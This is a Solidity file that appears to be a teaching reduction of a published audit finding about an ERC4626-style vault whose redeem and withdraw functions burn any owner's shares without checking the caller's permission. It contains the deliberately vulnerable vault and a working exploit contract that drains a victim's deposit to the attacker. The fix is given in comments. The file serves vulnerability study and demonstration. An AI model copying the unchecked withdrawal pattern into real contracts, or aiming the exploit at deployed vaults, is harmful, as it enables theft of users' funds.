// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Royco ERC4626i — Missing permissions check in withdraw/redeem
    (Cantina, Aug 2024; finding #46674)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: ERC4626i.redeem / withdraw burn `owner`'s shares and send the
    underlying asset to `receiver` WITHOUT checking that msg.sender is the
    owner or has allowance. Any caller can redeem any other user's shares to
    themselves — direct theft of deposited assets.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced ERC4626i — 1:1 vault missing the solmate allowance check on redeem/withdraw.
contract ERC4626i {
    MockERC20 public immutable asset;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(MockERC20 asset_) {
        asset = asset_;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = assets;
        asset.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    /// @notice Redeem shares from `owner` to `receiver`. MISSING owner/allowance check.
    function redeem(uint256 shares, address receiver, address owner) public returns (uint256 assets) {
        // FIX (solmate ERC4626):
        //   if (msg.sender != owner) {
        //       uint256 allowed = allowance[owner][msg.sender];
        //       if (allowed != type(uint256).max) allowance[owner][msg.sender] = allowed - shares;
        //   }
        balanceOf[owner] -= shares; // @> VULN: no msg.sender==owner / allowance check — anyone burns owner shares
        totalSupply -= shares;
        assets = shares; // 1:1
        asset.transfer(receiver, assets);
    }

    /// @notice Withdraw assets from `owner` to `receiver`. Same missing check.
    function withdraw(uint256 assets, address receiver, address owner) public returns (uint256 shares) {
        shares = assets;
        balanceOf[owner] -= shares; // @> VULN: same missing permissions check as redeem
        totalSupply -= shares;
        asset.transfer(receiver, assets);
    }
}

/// @dev Alice (attacker) redeems Bob's shares to herself — steals the deposit.
contract Exploit {
    MockERC20 public token;
    ERC4626i public vault;
    address public constant BOB = address(0xB0B);
    address public constant ALICE = address(0xA11CE);

    uint256 public constant AMOUNT = 1 ether;
    uint256 public stolen;

    constructor() {
        token = new MockERC20("Mock Token", "MOCK");
        vault = new ERC4626i(token);

        // Bob deposits 1 ether of underlying, receives 1 ether shares.
        token.mint(address(this), AMOUNT);
        token.approve(address(vault), AMOUNT);
        vault.deposit(AMOUNT, BOB);
        require(vault.balanceOf(BOB) == AMOUNT, "bob has shares");
        require(token.balanceOf(address(vault)) == AMOUNT, "vault funded");
    }

    function run() external {
        // Alice has NO allowance from Bob and is not Bob — should not be able to redeem.
        // Missing check lets her redeem Bob's shares to herself.
        vault.redeem(AMOUNT, address(this), BOB);

        stolen = token.balanceOf(address(this));
        // HARM: attacker holds the underlying; Bob's shares are gone; vault empty.
        require(stolen == AMOUNT, "did not steal full deposit");
        require(vault.balanceOf(BOB) == 0, "bob shares burned");
        require(token.balanceOf(address(vault)) == 0, "vault drained");
    }
}
